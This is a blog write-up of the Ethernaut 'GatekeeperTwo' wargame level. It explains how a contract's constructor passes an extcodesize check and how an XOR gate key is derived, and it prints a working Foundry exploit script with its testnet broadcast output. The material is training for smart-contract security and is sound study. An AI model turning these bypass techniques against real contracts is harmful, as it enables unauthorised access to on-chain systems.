---
layout: post
title: "[Ethernaut] 14.GateKeeper Two"
tags: blockchain ethernaut foundry assembly extcodesize XOR
---

# Analysis

---

The goal is

1. Register as an entrant to pass this level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

`assembly` keyword allows a contract to access functionality that is not native to vanilla Solidity.

`extcodesize` call will get the size of a contract's code at a given address.

If the size of a contract’s code at a given address is zero, it indicates that the address is EOA 

However, this seems to conflict with `gateOne()` modifier

In section 7 of [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf), I found sentence:

 > “During initialization code execution, EXTCODESIZE on the address should return zero”

I also found the concept “initialization code excution” in [here](https://docs.soliditylang.org/en/latest/contracts.html#creating-contracts).

> 💡 When a contract is **created**, its [constructor](https://docs.soliditylang.org/en/latest/contracts.html#constructor) (a function declared with the `constructor` keyword) is executed once.

 Solving the `gateThree()` modifier is straightforward if you use the properties of XOR:

given `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max` , derive `uint64(_gateKey)`  by computing `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max`

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    constructor(GatekeeperTwo gkt_) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gkt_.enter(gateKey);
    }
}

contract GateKeeperTwoSol is Script {
    GatekeeperTwo public gkt_ = GatekeeperTwo(0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    
        console.log("Before entrant: ", gkt_.entrant());
        Ex ex = new Ex(gkt_);
        console.log("After entrant: ", gkt_.entrant());

        vm.stopBroadcast();
    }
}
```

```bash
$ forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol --broadcast
[⠊] Compiling...
[⠒] Compiling 26 files with Solc 0.8.29
[⠆] Compiling 4 files with Solc 0.6.12
[⠑] Solc 0.6.12 finished in 42.16ms
[⠘] Solc 0.8.29 finished in 335.40ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> script/GateKeeperTwoSol.sol:22:9:
   |
22 |         Ex ex = new Ex(gkt_);
   |         ^^^^^

Script ran successfully.

== Logs ==
  Before entrant:  0x0000000000000000000000000000000000000000
  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514

## Setting up 1 EVM.

==========================

Chain 17000

Estimated gas price: 0.00107283 gwei

Estimated total gas used for script: 135274

Estimated amount required: 0.00000014512600542 ETH

==========================

##### holesky
✅  [Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1
Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2
Block: 3750329
Paid: 0.000000111634638854 ETH (104057 gas * 0.001072822 gwei)

✅ Sequence #1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```

![Image complete]({{site.url}}/images/2025-04-28-GateKeeperTwo/complete.png)